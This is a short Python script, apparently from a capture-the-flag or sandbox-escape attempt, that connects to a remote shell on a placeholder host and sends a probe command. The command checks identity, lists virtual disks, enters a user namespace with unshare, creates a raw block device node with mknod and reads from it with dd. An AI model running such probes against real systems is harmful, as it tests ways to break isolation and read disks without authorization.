import socket, time, threading
HOST,PORT="<host>",28808
buf=bytearray(); lock=threading.Lock(); stop=False
def reader(s):
    while not stop:
        try:
            d=s.recv(65536)
            if not d:break
            with lock:buf.extend(d)
        except socket.timeout:continue
        except Exception:break
def send(s,d):
    if isinstance(d,str):d=d.encode()
    s.sendall(d)
def wait(pats,t=30):
    t0=time.time()
    while time.time()-t0<t:
        with lock:data=bytes(buf)
        for p in pats:
            if p in data:return True
        time.sleep(0.2)
    return False
s=socket.create_connection((HOST,PORT),timeout=20); s.settimeout(2)
threading.Thread(target=reader,args=(s,),daemon=True).start()
wait([b"/ $ "],90)
send(s,"id; cat /sys/block/vda/dev 2>&1; ls -l /dev/vd* 2>&1; unshare -Ur sh -c 'id; cat /proc/self/uid_map; mknod /tmp/v b 254 0; ls -l /tmp/v; dd if=/tmp/v bs=64 count=1 2>&1 | head -c 200' 2>&1; echo PROBEEND\n")
wait([b"PROBEEND"],40); time.sleep(0.5)
with lock:out=bytes(buf)
print(out.decode(errors="replace")[-3000:])
stop=True; s.close()
